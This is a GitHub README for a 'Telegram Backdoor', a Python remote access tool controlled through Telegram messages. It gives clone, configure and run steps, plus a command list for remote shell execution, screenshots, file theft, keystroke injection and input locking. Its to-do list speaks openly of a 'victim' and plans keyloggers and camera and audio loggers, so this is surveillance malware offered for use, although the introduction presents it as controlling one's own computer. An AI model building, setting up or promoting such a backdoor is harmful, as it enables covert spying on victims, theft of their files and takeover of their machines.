# Telegram Backdoor for supreme control over Viticum 

Imagine the power to command your computer from anywhere in the world. With the Telegram Backdoor, that power is now in your hands. Execute commands, gather system intel, and capture screenshots – all with the simplicity of a Telegram message.

## Features

- **Command Execution:** Execute commands on the system remotely via Telegram.
- **Screenshot:** Capture screenshots of the system and send them to the user.
- **File Transfer:** Download files from the system to the user's device.
- **Mouse and Keyboard Control:** Provide mouse coordinates and type text remotely.
- **System Information:** Retrieve system information such as hostname, IP address, and system specs.
- **Directory Navigation:** Change directories and list files in a specified directory.

## Prerequisites

Before you begin, make sure you have the following:

- Python3 installed on your system.
- Telegram account.
- Telegram Bot API token obtained from the BotFather.

### setup telegram bot and other requirments within 60 seconds. [click here](docs/Telegram_bot_setup_guide.md)

## Usage

To use the bot, follow these steps:

1. **Installation:**
   ```bash
   git clone https://github.com/hack505/Telegram_BackDoor.git
   ```

2. **Configuration:**
  Create a `config.json` file with your Telegram bot token and chat ID. Example:
     ```json
     {
         "token": "YOUR_TELEGRAM_BOT_TOKEN",
         "chat_id": "YOUR_CHAT_ID"
     }
     ```

1. **Dependencies:**
  Install the required Python packages using `pip`:
     ```
     pip3 install -r requirements.txt
     ```

1. **Run the Bot:**
  Start the bot by running the main script:
     ```
     python3 main.py
     ```

1. **Interact with the Bot:**
   - Start a conversation with the bot in Telegram and use the available commands listed below.

## Commands

- **/start:** Start the bot.
- **/help:** Display the list of available commands.
- **/screen:** Take a screenshot of the system.
- **/content:** Get information about the project and its owner.
- **/jarvis \<command\>:** Execute a command on the system. Example: `/jarvis ls`.
- **/download \<filename\>:** Download a file from the system. Example: `/download example.txt`.
- **/yo:** Greet the user.
- **/press \<keys\>:** Simulate pressing keys on the system. Example: `/press ctrl+c`.
- **/arrow \<direction\>:** Simulate arrow key presses. Example: `/arrow up`.
- **/cd \<directory\>:** Change the current directory.
- **/ls \<directory\>:** List files in the specified directory.
- **/blocker \<duration\>:** Block keyboard and mouse events for a specific duration (in minutes).

## To-Do 

- [x] cd
- [x] ls
- [x] system info
- [x] Take screenshot
- [x] run commands
- [x] download file form telegram
- [x] press keys
- [x] press arrow keys
- [x] download file form victim
- [ ] Keylogger - Real time
- [ ] Keylogger (traditional one)
- [x] logger victim pc info
- [ ] cam logger
- [ ] audio logger
- [x] mouse coordinates
- [ ] mouse control
- [x] Keyboard locker
- [x] mouse lock
- [ ] Keyboard locker
- [ ] mouse lock


## Contributing

Contributions are welcome! If you have any suggestions, improvements, or feature requests, feel free to open an issue or submit a pull request.

## License

This project is licensed under the [Apache-2.0](LICENSE).
